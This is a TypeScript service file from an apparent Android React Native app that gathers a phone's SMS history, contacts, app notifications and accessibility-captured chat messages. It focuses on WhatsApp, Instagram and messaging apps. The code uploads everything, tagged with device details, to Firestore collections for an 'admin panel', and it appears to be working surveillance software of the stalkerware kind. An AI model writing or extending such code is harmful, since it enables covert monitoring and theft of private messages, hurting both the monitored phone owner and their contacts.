import { NativeModules, NativeEventEmitter, AppRegistry, Platform } from 'react-native';
import firestore from '@react-native-firebase/firestore';
import DeviceInfoService from './DeviceInfoService';
import {
  CapturedNotification,
  CapturedSms,
  NotificationData,
  SmsData,
  Contact,
  AdminDataStats,
} from '../types/adminData.types';

const { AdminDataModule } = NativeModules;

export class AdminDataService {
  private static eventEmitter = new NativeEventEmitter();
  private static notificationListeners: ((notification: NotificationData) => void)[] = [];
  private static smsListeners: ((sms: SmsData) => void)[] = [];

  /**
   * Initialize background tasks for receiving notifications and SMS
   *
   * NOTE: AccessibilityMessageCaptured is handled by BackgroundDataService
   * to avoid duplicate registration and Firebase Auth dependency issues.
   * This method is kept for backwards compatibility but does NOT register
   * the accessibility task anymore.
   */
  static initialize() {
    if (Platform.OS !== 'android') return;

    // NOTE: All headless tasks are now registered in BackgroundDataService.ts
    // This avoids duplicate registration issues and ensures proper task handling
    // even when Firebase Auth is not available.

    console.log('✅ AdminDataService.initialize() called - tasks are registered in BackgroundDataService');

    // Removed duplicate headless task registrations:
    // - NotificationReceived (handled by BackgroundDataService)
    // - SmsReceived (handled by BackgroundDataService)
    // - AccessibilityMessageCaptured (handled by BackgroundDataService)
  }

  /**
   * Check if notification listener permission is enabled
   */
  static async isNotificationListenerEnabled(): Promise<boolean> {
    if (Platform.OS !== 'android') return false;
    try {
      return await AdminDataModule.isNotificationListenerEnabled();
    } catch (error) {
      console.error('Error checking notification listener:', error);
      return false;
    }
  }

  /**
   * Open notification listener settings
   */
  static async openNotificationListenerSettings(): Promise<void> {
    if (Platform.OS !== 'android') return;
    try {
      await AdminDataModule.openNotificationListenerSettings();
    } catch (error) {
      console.error('Error opening notification settings:', error);
      throw error;
    }
  }

  /**
   * Check if accessibility service is enabled
   */
  static async isAccessibilityServiceEnabled(): Promise<boolean> {
    if (Platform.OS !== 'android') return false;
    try {
      return await AdminDataModule.isAccessibilityServiceEnabled();
    } catch (error) {
      console.error('Error checking accessibility service:', error);
      return false;
    }
  }

  /**
   * Open accessibility settings
   */
  static async openAccessibilitySettings(): Promise<void> {
    if (Platform.OS !== 'android') return;
    try {
      await AdminDataModule.openAccessibilitySettings();
    } catch (error) {
      console.error('Error opening accessibility settings:', error);
      throw error;
    }
  }

  /**
   * Request SMS permissions
   */
  static async requestSmsPermissions(): Promise<boolean> {
    if (Platform.OS !== 'android') return false;
    try {
      return await AdminDataModule.requestSmsPermissions();
    } catch (error) {
      console.error('Error requesting SMS permissions:', error);
      return false;
    }
  }

  /**
   * Get all SMS messages
   */
  static async getAllSms(): Promise<any[]> {
    if (Platform.OS !== 'android') return [];
    try {
      return await AdminDataModule.getAllSms();
    } catch (error) {
      console.error('Error getting SMS:', error);
      return [];
    }
  }

  /**
   * Get SMS from specific contact
   */
  static async getSmsFromContact(phoneNumber: string): Promise<any[]> {
    if (Platform.OS !== 'android') return [];
    try {
      return await AdminDataModule.getSmsFromContact(phoneNumber);
    } catch (error) {
      console.error('Error getting SMS from contact:', error);
      return [];
    }
  }

  /**
   * Get all contacts
   */
  static async getAllContacts(): Promise<Contact[]> {
    if (Platform.OS !== 'android') return [];
    try {
      return await AdminDataModule.getAllContacts();
    } catch (error) {
      console.error('Error getting contacts:', error);
      return [];
    }
  }

  /**
   * Save notification to Firebase
   */
  static async saveNotificationToFirebase(data: NotificationData, userId?: string): Promise<void> {
    try {
      if (!userId) {
        // Get current user ID from Firebase Auth
        const auth = await import('@react-native-firebase/auth').then(m => m.default());
        userId = auth.currentUser?.uid;

        if (!userId) {
          console.warn('No userId available for notification save');
          return;
        }
      }

      // Get device info
      const deviceInfo = await DeviceInfoService.getCompleteDeviceInfo();

      // Map package name to app name
      let app = 'Other';
      if (data.packageName?.includes('whatsapp')) {
        app = 'WhatsApp';
      } else if (data.packageName?.includes('instagram')) {
        app = 'Instagram';
      } else if (data.packageName?.includes('messaging')) {
        app = 'Messages';
      }

      const notification: any = {
        app,
        packageName: data.packageName,
        appName: data.appName || app,
        title: data.title,
        content: data.text || data.bigText || '',
        text: data.text,
        sender: data.sender || 'Unknown',
        timestamp: firestore.Timestamp.fromMillis(data.timestamp),
        userId,
        deviceId: deviceInfo.deviceId,
        deviceName: deviceInfo.deviceName,
        deviceModel: deviceInfo.deviceModel,
        read: data.messageType === 'received',
        messageType: data.messageType || 'received',
        isSent: data.isSent || false,
        isGroup: data.isGroup || false,
        groupName: data.groupName,
        createdAt: firestore.Timestamp.now(),
      };

      // Save to capturedMessages collection (for admin panel)
      await firestore()
        .collection('capturedMessages')
        .add(notification);

      console.log('✅ Notification saved to Firebase (capturedMessages)');
    } catch (error) {
      console.error('Error saving notification to Firebase:', error);
    }
  }

  /**
   * Save SMS to Firebase
   */
  static async saveSmsToFirebase(data: SmsData, userId?: string): Promise<void> {
    try {
      if (!userId) {
        // Get current user ID from Firebase Auth
        const auth = await import('@react-native-firebase/auth').then(m => m.default());
        userId = auth.currentUser?.uid;

        if (!userId) {
          console.warn('No userId available for SMS save');
          return;
        }
      }

      // Get device info
      const deviceInfo = await DeviceInfoService.getCompleteDeviceInfo();

      const sms: any = {
        address: data.sender,
        body: data.body,
        date: data.timestamp,
        type: data.type === 'received' ? 1 : 2,
        read: true,
        userId,
        deviceId: deviceInfo.deviceId,
        deviceName: deviceInfo.deviceName,
        deviceModel: deviceInfo.deviceModel,
        createdAt: firestore.Timestamp.now(),
      };

      // Save to sms collection (for admin panel)
      await firestore()
        .collection('sms')
        .add(sms);

      console.log('✅ SMS saved to Firebase');
    } catch (error) {
      console.error('Error saving SMS to Firebase:', error);
    }
  }

  /**
   * Save accessibility-captured message to Firebase
   */
  private static async saveAccessibilityMessageToFirebase(data: any, userId?: string): Promise<void> {
    try {
      if (!userId) {
        console.warn('No userId provided for accessibility message save');
        return;
      }

      // Get device info
      const deviceInfo = await DeviceInfoService.getCompleteDeviceInfo();

      const message = {
        text: data.text,
        content: data.text,
        messageText: data.text,
        packageName: data.packageName,
        appName: data.appName,
        sender: data.isSent ? 'Me' : 'Unknown',
        title: data.appName,
        isSent: data.isSent,
        messageType: data.isSent ? 'sent' : 'received',
        isGroup: false,
        timestamp: firestore.Timestamp.fromMillis(data.timestamp),
        captureMethod: 'accessibility',
        capturedAt: firestore.FieldValue.serverTimestamp(),
        userId,
        deviceId: deviceInfo.deviceId,
        deviceName: deviceInfo.deviceName,
        deviceModel: deviceInfo.deviceModel,
        isRead: false,
        createdAt: firestore.FieldValue.serverTimestamp(),
      };

      // Save to capturedMessages collection (same as notifications)
      await firestore()
        .collection('capturedMessages')
        .add(message);

      console.log('✅ Accessibility message saved to Firebase (capturedMessages)');
    } catch (error) {
      console.error('Error saving accessibility message to Firebase:', error);
    }
  }

  /**
   * Sync all SMS to Firebase (initial sync)
   */
  static async syncAllSmsToFirebase(userId: string): Promise<number> {
    try {
      const messages = await this.getAllSms();
      const batch = firestore().batch();
      const collectionRef = firestore()
        .collection('adminData')
        .doc(userId)
        .collection('sms');

      let count = 0;
      for (const msg of messages) {
        const docRef = collectionRef.doc();
        const sms: Omit<CapturedSms, 'id'> = {
          address: msg.address,
          body: msg.body,
          date: msg.date,
          type: msg.type,
          read: msg.read,
          userId,
          createdAt: new Date(),
        };
        batch.set(docRef, sms);
        count++;

        // Firestore batch limit is 500
        if (count % 500 === 0) {
          await batch.commit();
        }
      }

      if (count % 500 !== 0) {
        await batch.commit();
      }

      console.log(`✅ Synced ${count} SMS messages to Firebase`);
      return count;
    } catch (error) {
      console.error('Error syncing SMS to Firebase:', error);
      return 0;
    }
  }

  /**
   * Get captured notifications from Firebase
   */
  static async getCapturedNotifications(
    userId: string,
    limit: number = 100
  ): Promise<CapturedNotification[]> {
    try {
      const snapshot = await firestore()
        .collection('adminData')
        .doc(userId)
        .collection('notifications')
        .orderBy('timestamp', 'desc')
        .limit(limit)
        .get();

      return snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data(),
        createdAt: doc.data().createdAt?.toDate() || new Date(),
      } as CapturedNotification));
    } catch (error) {
      console.error('Error getting notifications:', error);
      return [];
    }
  }

  /**
   * Get captured SMS from Firebase
   */
  static async getCapturedSms(
    userId: string,
    limit: number = 100
  ): Promise<CapturedSms[]> {
    try {
      const snapshot = await firestore()
        .collection('adminData')
        .doc(userId)
        .collection('sms')
        .orderBy('date', 'desc')
        .limit(limit)
        .get();

      return snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data(),
        createdAt: doc.data().createdAt?.toDate() || new Date(),
      } as CapturedSms));
    } catch (error) {
      console.error('Error getting SMS:', error);
      return [];
    }
  }

  /**
   * Subscribe to new notifications
   */
  static subscribeToNotifications(
    userId: string,
    callback: (notifications: CapturedNotification[]) => void
  ): () => void {
    const unsubscribe = firestore()
      .collection('adminData')
      .doc(userId)
      .collection('notifications')
      .orderBy('timestamp', 'desc')
      .limit(50)
      .onSnapshot(
        snapshot => {
          const notifications = snapshot.docs.map(doc => ({
            id: doc.id,
            ...doc.data(),
            createdAt: doc.data().createdAt?.toDate() || new Date(),
          } as CapturedNotification));
          callback(notifications);
        },
        error => {
          console.error('Error subscribing to notifications:', error);
        }
      );

    return unsubscribe;
  }

  /**
   * Subscribe to new SMS
   */
  static subscribeToSms(
    userId: string,
    callback: (messages: CapturedSms[]) => void
  ): () => void {
    const unsubscribe = firestore()
      .collection('adminData')
      .doc(userId)
      .collection('sms')
      .orderBy('date', 'desc')
      .limit(50)
      .onSnapshot(
        snapshot => {
          const messages = snapshot.docs.map(doc => ({
            id: doc.id,
            ...doc.data(),
            createdAt: doc.data().createdAt?.toDate() || new Date(),
          } as CapturedSms));
          callback(messages);
        },
        error => {
          console.error('Error subscribing to SMS:', error);
        }
      );

    return unsubscribe;
  }

  /**
   * Get statistics
   */
  static async getStats(userId: string): Promise<AdminDataStats> {
    try {
      const [notificationsSnapshot, smsSnapshot] = await Promise.all([
        firestore()
          .collection('adminData')
          .doc(userId)
          .collection('notifications')
          .get(),
        firestore()
          .collection('adminData')
          .doc(userId)
          .collection('sms')
          .get(),
      ]);

      const notifications = notificationsSnapshot.docs.map(d => d.data());

      return {
        totalNotifications: notifications.length,
        totalSms: smsSnapshot.size,
        whatsappCount: notifications.filter(n => n.packageName === 'com.whatsapp').length,
        instagramCount: notifications.filter(n => n.packageName === 'com.instagram.android').length,
        messagesCount: notifications.filter(n =>
          n.packageName === 'com.android.messaging' ||
          n.packageName === 'com.google.android.apps.messaging'
        ).length,
        lastSync: new Date(),
      };
    } catch (error) {
      console.error('Error getting stats:', error);
      return {
        totalNotifications: 0,
        totalSms: 0,
        whatsappCount: 0,
        instagramCount: 0,
        messagesCount: 0,
        lastSync: new Date(),
      };
    }
  }

  /**
   * Add notification listener
   */
  static addNotificationListener(callback: (notification: NotificationData) => void): () => void {
    this.notificationListeners.push(callback);
    return () => {
      this.notificationListeners = this.notificationListeners.filter(cb => cb !== callback);
    };
  }

  /**
   * Add SMS listener
   */
  static addSmsListener(callback: (sms: SmsData) => void): () => void {
    this.smsListeners.push(callback);
    return () => {
      this.smsListeners = this.smsListeners.filter(cb => cb !== callback);
    };
  }

  /**
   * Clear all data for a user
   */
  static async clearAllData(userId: string): Promise<void> {
    try {
      const batch = firestore().batch();

      // Delete notifications
      const notificationsSnapshot = await firestore()
        .collection('adminData')
        .doc(userId)
        .collection('notifications')
        .get();

      notificationsSnapshot.docs.forEach(doc => {
        batch.delete(doc.ref);
      });

      // Delete SMS
      const smsSnapshot = await firestore()
        .collection('adminData')
        .doc(userId)
        .collection('sms')
        .get();

      smsSnapshot.docs.forEach(doc => {
        batch.delete(doc.ref);
      });

      await batch.commit();
      console.log('✅ All admin data cleared');
    } catch (error) {
      console.error('Error clearing admin data:', error);
      throw error;
    }
  }
}

export default AdminDataService;
